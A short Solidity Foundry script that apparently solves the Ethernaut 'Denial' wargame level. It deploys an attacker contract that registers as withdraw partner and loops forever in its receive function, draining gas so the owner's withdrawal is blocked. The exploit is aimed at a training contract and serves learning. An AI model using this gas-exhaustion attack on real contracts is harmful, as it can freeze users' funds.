// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Denial} from "../instances/Ilevel20.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        Denial denial = new Denial();
        DeniaHack deniaHack = new DeniaHack(address(denial));
        denial.withdraw();
        vm.stopBroadcast();
    }
}

contract DeniaHack is Test {
    Denial denial;

    constructor(address _denial) {
        denial = Denial(payable(_denial));
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {
            console.log("receive");
        }
    }
}
